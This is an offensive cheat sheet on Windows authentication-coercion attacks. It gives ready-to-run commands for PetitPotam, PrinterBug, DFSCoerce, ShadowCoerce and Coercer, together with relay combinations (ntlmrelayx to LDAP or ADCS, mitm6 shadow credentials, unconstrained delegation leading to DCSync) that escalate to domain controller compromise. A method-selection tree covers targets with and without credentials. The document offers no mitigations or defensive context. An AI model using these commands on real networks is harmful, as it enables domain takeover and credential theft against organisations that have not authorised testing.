# Authentication Coercion Methods

---

## 1. COERCION METHODS MATRIX

| Method | RPC Interface | Function | Protocol | Auth Type | Requires Creds? | Target |
|---|---|---|---|---|---|---|
| **PetitPotam** | MS-EFSR (lsarpc) | EfsRpcOpenFileRaw + variants | SMB (445) | Machine account | No (unauthenticated on unpatched) | DC/Any |
| **PrinterBug** | MS-RPRN (spoolss) | RpcRemoteFindFirstPrinterChangeNotificationEx | SMB (445) | Machine account | Yes (domain user) | Any with Spooler |
| **DFSCoerce** | MS-DFSNM (netdfs) | NetrDfsRemoveStdRoot / NetrDfsAddStdRoot | SMB (445) | Machine account | Yes (domain user) | DC |
| **ShadowCoerce** | MS-FSRVP (fssagent) | IsPathShadowCopied / IsPathSupported | SMB (445) | Machine account | Yes (domain user) | File servers |

---

## 2. PETITPOTAM — MS-EFSR ABUSE

```bash
# Unauthenticated (pre-patch)
PetitPotam.py LISTENER_IP TARGET_IP
PetitPotam.py -method EfsRpcOpenFileRaw LISTENER_IP TARGET_IP

# Authenticated (required on patched systems)
PetitPotam.py -u user -p password -d domain.com LISTENER_IP TARGET_IP
```

### EFS RPC Function Variants

| Function | Patched? | Notes |
|---|---|---|
| `EfsRpcOpenFileRaw` | Patched (Nov 2021) | Original function |
| `EfsRpcEncryptFileSrv` | Patched later | Alternative |
| `EfsRpcDecryptFileSrv` | Partially patched | May still work |
| `EfsRpcQueryUsersOnFile` | Partially patched | May still work |

---

## 3. PRINTERBUG — MS-RPRN

```bash
# Check if Spooler is running
rpcdump.py DOMAIN/user:pass@TARGET_IP | grep -i spoolss
crackmapexec smb TARGET_IP -u user -p pass -M spooler

# Coerce
SpoolSample.exe TARGET_HOST LISTENER_HOST
printerbug.py DOMAIN/user:password@TARGET_IP LISTENER_IP
```

---

## 4. DFSCOERCE — MS-DFSNM

```bash
python3 dfscoerce.py -u user -p password -d domain.com LISTENER_IP TARGET_IP
python3 dfscoerce.py -u user -p password -d domain.com \
  -method NetrDfsRemoveStdRoot LISTENER_IP TARGET_IP
```

---

## 5. SHADOWCOERCE — MS-FSRVP

```bash
python3 shadowcoerce.py -u user -p password -d domain.com LISTENER_IP TARGET_IP
```

---

## 6. COERCER — AUTOMATED DISCOVERY

```bash
# Scan for available coercion methods
coercer scan -u user -p password -d domain.com -t TARGET_IP

# Coerce using all available methods
coercer coerce -u user -p password -d domain.com -t TARGET_IP -l LISTENER_IP

# Specific method
coercer coerce -u user -p password -d domain.com -t TARGET_IP -l LISTENER_IP \
  --filter-method-name EfsRpcOpenFileRaw

# Unauthenticated scan
coercer scan -t TARGET_IP
```

---

## 7. COERCION + RELAY COMBINATIONS

### Combo 1: PetitPotam + LDAP Relay → RBCD

```bash
ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support
PetitPotam.py ATTACKER_IP DC01_IP
getST.py -spn cifs/DC01.domain.com -impersonate administrator DOMAIN/'EVIL$':'pass'
```

### Combo 2: PrinterBug + Unconstrained Delegation

```bash
Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$
printerbug.py DOMAIN/user:pass@DC01 UNCONSTRAINED_HOST
# Capture DC01$ TGT → DCSync
```

### Combo 3: PetitPotam + ADCS Relay (ESC8)

```bash
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
PetitPotam.py ATTACKER_IP DC01_IP
certipy auth -pfx dc01.pfx -dc-ip DC02_IP
```

### Combo 4: mitm6 + LDAP Relay → Shadow Credentials

```bash
mitm6 -d domain.com
ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --shadow-credentials -smb2support
```

### Combo 5: WebDAV Coercion + LDAP Relay

```bash
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support
PetitPotam.py ATTACKER@80/test WORKSTATION_IP
```

---

## 8. COERCION METHOD SELECTION TREE

```
Need to coerce authentication
│
├── Target is a Domain Controller?
│   ├── PetitPotam (unauthenticated if unpatched)
│   ├── PetitPotam (authenticated — most reliable)
│   ├── DFSCoerce (if DFS role installed)
│   └── PrinterBug (if Spooler running — rare on modern DCs)
│
├── Target is a file server?
│   ├── ShadowCoerce (if FSRVP agent running)
│   ├── PetitPotam (authenticated)
│   └── PrinterBug (if Spooler running)
│
├── Target is a workstation?
│   ├── PrinterBug (Spooler usually running)
│   ├── PetitPotam (authenticated)
│   └── WebDAV coercion (if WebClient running — HTTP-based!)
│
├── No creds available?
│   ├── PetitPotam unauthenticated (unpatched systems only)
│   ├── Responder poisoning (passive capture)
│   └── mitm6 (DHCPv6 DNS takeover)
│
└── Not sure what works?
    └── Use Coercer tool: coercer scan -t TARGET
```
